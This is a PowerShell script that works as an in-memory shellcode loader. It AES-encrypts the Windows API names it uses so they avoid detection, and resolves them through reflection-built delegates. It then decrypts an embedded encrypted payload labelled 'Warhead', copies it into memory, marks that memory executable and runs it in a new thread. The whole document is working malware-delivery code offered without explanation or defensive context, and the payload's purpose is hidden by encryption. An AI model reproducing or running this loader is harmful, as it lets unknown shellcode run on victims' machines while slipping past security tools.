Function AES_Shellcode_Runner_Delegate {

    function Invoke-FunctionLookup {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [string] $moduleName,

            [Parameter(Position = 1, Mandatory = $true)] 
            [string] $functionName
        )

        $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
            Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $dsystem_dll }
        ).GetType($dMicrosoft_Win32_UnsafeNativeMethods)

        $getProcAddressMethod = $systemType.GetMethods() | 
        Where-Object { $_.Name -eq $dGetProcAddress }

        $moduleHandle = $systemType.GetMethod($dGetModuleHandle).Invoke($null, @($moduleName))

        return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
    }

    function Invoke-GetDelegate {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [Type[]] $parameterTypes,

            [Parameter(Position = 1, Mandatory = $false)] 
            [Type] $returnType = [Void]
        )

        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
         (New-Object System.Reflection.AssemblyName($dReflectedDelegate)),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )

        $moduleBuilder = $assemblyBuilder.DefineDynamicModule($dInMemoryModule, $false)

        $typeBuilder = $moduleBuilder.DefineType(
            'MyDelegateType', 
            [System.Reflection.TypeAttributes]::Class -bor 
            [System.Reflection.TypeAttributes]::Public -bor 
            [System.Reflection.TypeAttributes]::Sealed -bor 
            [System.Reflection.TypeAttributes]::AnsiClass -bor 
            [System.Reflection.TypeAttributes]::AutoClass, 
            [System.MulticastDelegate]
        )

        $constructorBuilder = $typeBuilder.DefineConstructor(
            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::Public,
            [System.Reflection.CallingConventions]::Standard,
            $parameterTypes
        )

        $constructorBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            [System.Reflection.MethodAttributes]::Public -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::NewSlot -bor 
            [System.Reflection.MethodAttributes]::Virtual,
            $returnType,
            $parameterTypes
        )

        $methodBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        return $typeBuilder.CreateType()
    }

    
    function Invoke-DecryptAES {
        param (
            [byte[]]$Data,
            [string]$KeyBase64,
            [string]$IVBase64,
            [switch]$Bytes
        )

        $Key = [System.Convert]::FromBase64String($KeyBase64)
        $IV = [System.Convert]::FromBase64String($IVBase64)

        $AES = [Security.Cryptography.SymmetricAlgorithm]::Create('AES')
        $AES.Key = $Key
        $AES.IV = $IV

        $decryptor = $AES.CreateDecryptor($AES.Key, $AES.IV)
        $memoryStream = New-Object -TypeName IO.MemoryStream -ArgumentList (, $Data)
        $cryptoStream = New-Object -TypeName Security.Cryptography.CryptoStream -ArgumentList @($memoryStream, $decryptor, 'Read')

        $decryptedBytes = New-Object -TypeName Byte[] -ArgumentList $Data.Length
        $decryptedByteCount = $cryptoStream.Read($decryptedBytes, 0, $decryptedBytes.Length)
    
        $cryptoStream.Close()
        $memoryStream.Close()

        if ($Bytes) {
            return $decryptedBytes[0..($decryptedByteCount - 1)]
        }
        else {
            $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes[0..($decryptedByteCount - 1)])

            if ($decryptedString -like "*_END_*") {
                $decryptedString = $decryptedString -replace "_END_$", ""
            }

            return $decryptedString
        }
    }
    
    # Invoke-EncryptAES -InputStrings "WaitForSingleObject, VirtualAlloc, CreateThread, VirtualProtect, system.dll, GetProcAddress, GetModuleHandle, Microsoft.Win32.UnsafeNativeMethods, Kernel32.dll, ReflectedDelegate, InMemoryModule"
    [string] $GlobalKey = 'waeu0HN371CKYS3pZ2P5B/qpH2QSLWRF0Ikfv6yyKiE='
    [string] $GlobalIV = 'tn5Rw2UnEK9LA5gv/I++cQ=='

    [Byte[]] $dWaitForSingleObject_Bytes = + 0x9C, 0x88, 0xC2, 0xE9, 0xE5, 0xEE, 0x38, 0x2D, 0xC8, 0x6A, 0x54, 0x23, 0x0D, 0x22, 0xD8, 0xF5, 0x6D, 0xB0, 0x23, 0xD7, 0x35, 0x24, 0xC7, 0xED, 0xC6, 0x84, 0xF9, 0x32, 0xC7, 0xC0, 0x16, 0x9B
    [string] $dWaitForSingleObject = Invoke-DecryptAES -Data $dWaitForSingleObject_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dVirtualAlloc_Bytes = + 0x71, 0x76, 0x52, 0x0C, 0x06, 0x27, 0xDD, 0xE1, 0x64, 0x14, 0xB7, 0x61, 0xEF, 0x3F, 0xC1, 0xC8
    [string] $dVirtualAlloc = Invoke-DecryptAES -Data $dVirtualAlloc_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dCreateThread_Bytes = + 0x7F, 0x5E, 0x01, 0xAC, 0x3A, 0x31, 0xA4, 0x80, 0xD0, 0x1C, 0x45, 0x0C, 0xFE, 0xF9, 0xC2, 0x88
    [string] $dCreateThread = Invoke-DecryptAES -Data $dCreateThread_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dVirtualProtect_Bytes = + 0xED, 0x9A, 0xFA, 0xCF, 0x08, 0x32, 0x02, 0x82, 0xAE, 0x16, 0xA6, 0x7C, 0xA2, 0xB4, 0xC6, 0xA8
    [string] $dVirtualProtect = Invoke-DecryptAES -Data $dVirtualProtect_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dsystem_dll_Bytes = + 0xBB, 0xA3, 0x40, 0xEE, 0x07, 0xEA, 0xD0, 0x19, 0x0A, 0x90, 0x49, 0xAB, 0x17, 0x9F, 0xE5, 0x76
    [string] $dsystem_dll = Invoke-DecryptAES -Data $dsystem_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dGetProcAddress_Bytes = + 0x66, 0x77, 0x67, 0x3D, 0x39, 0x09, 0xA7, 0x79, 0xF0, 0x28, 0x73, 0x45, 0x89, 0x5D, 0x09, 0xCE
    [string] $dGetProcAddress = Invoke-DecryptAES -Data $dGetProcAddress_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dGetModuleHandle_Bytes = + 0x40, 0x02, 0xD1, 0x34, 0xAB, 0x0D, 0x04, 0xB5, 0x7F, 0xCB, 0x83, 0x0B, 0x12, 0xC7, 0x29, 0xF4
    [string] $dGetModuleHandle = Invoke-DecryptAES -Data $dGetModuleHandle_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dMicrosoft_Win32_UnsafeNativeMethods_Bytes = + 0x8A, 0x42, 0xF2, 0x03, 0x21, 0xAF, 0xBF, 0x57, 0x6B, 0xC8, 0xB3, 0x93, 0xE8, 0x07, 0x82, 0xA0, 0x8B, 0x63, 0x51, 0x1D, 0xDB, 0xD1, 0x56, 0xAD, 0xB7, 0xCC, 0x10, 0xBC, 0x57, 0x6F, 0x62, 0x45, 0x32, 0x8F, 0xEF, 0xA0, 0xE6, 0xE8, 0xFE, 0xD7, 0x8C, 0xC1, 0x21, 0xB7, 0x7E, 0xD4, 0x27, 0x5A
    [string] $dMicrosoft_Win32_UnsafeNativeMethods = Invoke-DecryptAES -Data $dMicrosoft_Win32_UnsafeNativeMethods_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dKernel32_dll_Bytes = + 0x3C, 0x26, 0x92, 0xA0, 0x06, 0x9E, 0x91, 0xCA, 0x30, 0x8D, 0x59, 0x2B, 0xEA, 0x04, 0xC0, 0x02
    [string] $dKernel32_dll = Invoke-DecryptAES -Data $dKernel32_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dReflectedDelegate_Bytes = + 0x86, 0x8E, 0xE9, 0xD6, 0x8B, 0x0B, 0xBB, 0x77, 0xAD, 0xFF, 0xBE, 0x31, 0x1B, 0x26, 0x5A, 0x34, 0x1E, 0xD5, 0x84, 0x96, 0xBD, 0x7D, 0xD8, 0xDA, 0x3F, 0xFF, 0x7A, 0xF5, 0xA8, 0xB3, 0xA1, 0xC1
    [string] $dReflectedDelegate = Invoke-DecryptAES -Data $dReflectedDelegate_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dInMemoryModule_Bytes = + 0x6B, 0xBA, 0x76, 0x55, 0xA7, 0x8C, 0xBC, 0x41, 0x1C, 0xF5, 0xEE, 0xB0, 0x3B, 0x03, 0x07, 0xE8
    [string] $dInMemoryModule = Invoke-DecryptAES -Data $dInMemoryModule_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV
    # End: Output from Invoke-EncryptAES.ps1

    $fnVirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dkernel32_dll -functionName $dVirtualAlloc), (Invoke-GetDelegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
    $fnCreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dkernel32_dll -functionName $dCreateThread), (Invoke-GetDelegate @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
    $fnVirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dkernel32_dll -functionName $dVirtualProtect), (Invoke-GetDelegate @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Boolean])))
    $fnWaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dkernel32_dll -functionName $dWaitForSingleObject), (Invoke-GetDelegate @([IntPtr], [UInt32]) ([UInt32])))

    # Warhead
    [Byte[]] $Warhead_Bytes = 0x6C, 0x2C, 0xDC, 0x17, 0xE4, 0xDC, 0x54, 0x2A, 0x7F, 0x60, 0x3E, 0x76, 0xB7, 0xCF, 0xA3, 0x92, 0x1E, 0x11, 0x25, 0x5E, 0xCB, 0x09, 0x65, 0x54, 0xBA, 0x81, 0xFE, 0x1A, 0x1F, 0x31, 0xEE, 0x72, 0x49, 0x19, 0x09, 0x3E, 0x07, 0xAD, 0xE7, 0x82, 0x61, 0xBE, 0xB2, 0x1D, 0xED, 0x04, 0xCC, 0x26, 0xA6, 0x92, 0x89, 0xBE, 0xCD, 0x6D, 0x98, 0xE8, 0x11, 0xCD, 0x4E, 0x6A, 0x27, 0x92, 0xEF, 0x63, 0xE5, 0x19, 0xBD, 0xEB, 0xCF, 0x22, 0xA3, 0x89, 0x82, 0x5F, 0xCC, 0xD8, 0xAC, 0x92, 0xC8, 0x81, 0xF4, 0xA9, 0x20, 0x7D, 0xDA, 0xD3, 0x3F, 0x4C, 0x91, 0x41, 0x57, 0x63, 0x76, 0x52, 0x51, 0xB5, 0xBD, 0xDC, 0x66, 0xA3, 0xA3, 0xC0, 0x35, 0xD4, 0x69, 0xE0, 0x51, 0x10, 0x9A, 0x57, 0x06, 0x5A, 0xD8, 0xDD, 0x9B, 0xE1, 0x62, 0x96, 0xC9, 0x09, 0x39, 0x8A, 0x7D, 0x1B, 0x2D, 0xBE, 0x00, 0x32, 0xAB, 0x13, 0x86, 0xD8, 0x98, 0x22, 0xB1, 0x05, 0xE3, 0x5E, 0xD1, 0xE2, 0xB4, 0xF6, 0xC1, 0xBE, 0xB3, 0x96, 0x5D, 0xE5, 0x77, 0x92, 0xEC, 0x4E, 0x84, 0x92, 0xA1, 0x7B, 0x20, 0xD7, 0x98, 0x9B, 0xC3, 0x0F, 0x2C, 0xF7, 0xB1, 0x01, 0x15, 0xC1, 0x99, 0x50, 0x3F, 0xCE, 0xE9, 0x1A, 0xD0, 0x95, 0xAE, 0x9D, 0xD9, 0x02, 0x5A, 0x80, 0x1E, 0x05, 0xDA, 0xBD, 0x57, 0xA9, 0xCF, 0x47, 0xA5, 0x8A, 0xB1, 0x6F, 0x4D, 0x9C, 0x10, 0x8F, 0x85, 0xF4, 0x68, 0xBF, 0x2B, 0xEF, 0xC3, 0x5B, 0x1A, 0x80, 0xB7, 0x21, 0x91, 0xA2, 0x3F, 0x67, 0xF2, 0x78, 0xD4, 0x19, 0xC9, 0xC9, 0x65, 0x7C, 0xE3, 0x1B, 0x23, 0xD1, 0x3A, 0xEE, 0xA9, 0xA6, 0x57, 0x4F, 0xB0, 0xAB, 0x32, 0x17, 0x78, 0x94, 0x27, 0xE4, 0x5E, 0xE4, 0x7A, 0x3E, 0x9B, 0x82, 0xE4, 0x8F, 0xBE, 0xAA, 0xD2, 0x54, 0x8D, 0x81, 0xEC, 0x53, 0x94, 0x12, 0xDC, 0xCB, 0xBA, 0xEE, 0x17, 0xB5, 0x33, 0xCD, 0x05, 0x20, 0xB2, 0x35, 0xD4, 0x6A, 0xD4, 0x82, 0xC4, 0x6C, 0x0B, 0xF3, 0xF2, 0xA1, 0x5D, 0x44, 0xED, 0x4F, 0xAC, 0x3A, 0x6F, 0x14, 0x17, 0x65, 0x8C, 0xB6, 0x58, 0xE7, 0x54, 0x7D, 0x8B, 0xE4, 0x65, 0x91, 0x4A, 0x2C, 0xEA, 0x0F
    [Byte[]] $Warhead = Invoke-DecryptAES -Data $Warhead_Bytes -KeyBase64 'JxFeJnHSAdLf1O6KamLeumHQD/8zP3BKkzbcDBATOKM=' -IVBase64 'FBxj2dab86mS1XcZaeUbOg==' -Bytes

    $address = $fnVirtualAlloc.Invoke([IntPtr]::Zero, $Warhead.Length, 0x3000, 0x04)
    [System.Runtime.InteropServices.Marshal]::Copy($Warhead, 0, $address, $Warhead.Length)

    $oldProtect = 0
    $fnVirtualProtect.Invoke($address, $Warhead.Length, 0x20, [ref] $oldProtect) > $null
    $thread = $fnCreateThread.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    try { $fnWaitForSingleObject.Invoke($thread, [uint32]::MaxValue) > $null } catch {}

} AES_Shellcode_Runner_Delegate
